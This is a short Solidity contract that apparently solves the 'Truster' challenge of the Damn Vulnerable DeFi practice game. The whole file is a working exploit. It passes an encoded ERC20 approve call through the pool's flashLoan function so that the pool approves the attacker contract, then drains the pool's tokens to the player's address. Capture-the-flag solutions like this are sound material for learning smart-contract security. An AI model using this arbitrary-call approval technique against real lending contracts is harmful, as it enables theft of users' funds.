// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackTruster {
    function attack(
        uint256 _amount,
        address _TrusterLenderPool,
        address _DamnValuableToken,
        address _player
    ) external {
        TrusterLenderPool pool = TrusterLenderPool(_TrusterLenderPool);
        IERC20 token = IERC20(_DamnValuableToken);

        bytes memory AttackData = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            _amount
        );

        pool.flashLoan(0, msg.sender, address(token), AttackData);

        token.transferFrom(address(pool), _player, _amount);
    }
}
